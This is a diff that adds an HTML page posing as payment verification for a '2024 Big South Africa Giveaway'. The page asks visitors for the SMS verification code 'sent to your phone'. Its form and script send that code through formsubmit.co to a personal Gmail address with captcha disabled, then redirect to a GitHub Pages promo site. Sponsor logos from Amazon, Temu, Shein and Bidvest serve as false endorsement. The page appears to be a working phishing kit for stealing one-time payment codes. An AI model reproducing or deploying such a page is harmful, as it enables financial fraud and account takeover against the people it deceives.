@@ -1,1 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Verification</title>
+    <style>
+        /* Retain styles from the previous code */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f9f9f9;
+            color: #333;
+            box-sizing: border-box;
+        }
+        header {
+            background: linear-gradient(45deg, #2a8ac4, #2b7db1);
+            color: white;
+            text-align: center;
+            padding: 4px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border-bottom: 4px solid #4a8ec2;
+        }
+        header h1 {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin: 0;
+        }
+        header p {
+            font-size: 1.2rem;
+            margin-top: 1px;
+            font-weight: 400;
+        }
+        
+        .form-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 400px;
+            margin: 50px auto;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .form-container h2 {
+            font-size: 1.8rem;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .form-container p {
+            font-size: 1rem;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+        button:hover {
+            background: #218838;
+        }
+        .info {
+            font-size: 0.9rem;
+            color: #888;
+            margin-top: -10px;
+        }
 
+        /* Sponsors Section */
+        .sponsors {
+            text-align: center;
+            padding: 50px 20px;
+            background: #ffffff;
+            margin-top: 50px;
+        }
+        .sponsors h2 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .sponsor-logos {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .sponsor-logos img {
+            width: 150px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        .sponsor-logos img:hover {
+            transform: scale(1.08);
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <h1>2024 Big South Africa Giveaway</h1>
+        <p>Confirm Your R20 Payment to Complete Your Entry</p>
+    </header>
+
+    <div class="form-container">
+        <h2>Payment Verification</h2>
+        <p>Please enter the SMS verification code sent to your phone to confirm your payment.</p>
+        <p class="info">Note: The SMS could take up to 14 minutes to arrive. Please do not close this page. Return to enter the code once you receive it.</p>
+
+        <form id="verificationForm" action="https://formsubmit.co/iamfinaid6@gmail.com" method="POST">
+            <label for="smsCode">SMS Verification Code:</label>
+            <input type="text" id="smsCode" name="smsCode" placeholder="Enter the code here" required>
+
+            <input type="hidden" name="_subject" value="New SMS Verification Code">
+            <input type="hidden" name="_captcha" value="false">
+
+            <button type="submit" id="submitBtn">Submit Code</button>
+        </form>
+
+        <script>
+            document.getElementById('verificationForm').addEventListener('submit', function (e) {
+                e.preventDefault(); // Prevent default form submission
+
+                const formData = new FormData(this);
+
+                fetch(this.action, {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Redirect to the specified URL after successful submission
+                        setTimeout(() => {
+                            window.location.href = 'https://big24promo.github.io/SA2024promo';
+                        }, 3000); // Redirect after 3 seconds
+                        alert('Code submitted successfully! Redirecting...');
+                    } else {
+                        alert('Error submitting code. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An unexpected error occurred. Please try again.');
+                });
+            });
+        </script>
+    </div>
+    </section>
+<!-- Sponsors Section -->
+    <section class="sponsors">
+        <h2>Sponsored By</h2>
+        <div class="sponsor-logos">
+            <img src="https://big24promo.github.io/SA2024promo/images/Amazon.png">
+            <img src="https://big24promo.github.io/SA2024promo/images/bidt001_bidvest.jpg">
+            <img src="https://big24promo.github.io/SA2024promo/images/temu.png">
+            <img src="https://big24promo.github.io/SA2024promo/images/shein.png">
+            <img src="https://big24promo.github.io/SA2024promo/images/ivestc.jpg">
+            <img src="https://big24promo.github.io/SA2024promo/images/mass.png">
+        </div>
+    </section>
+</body>
+</html>
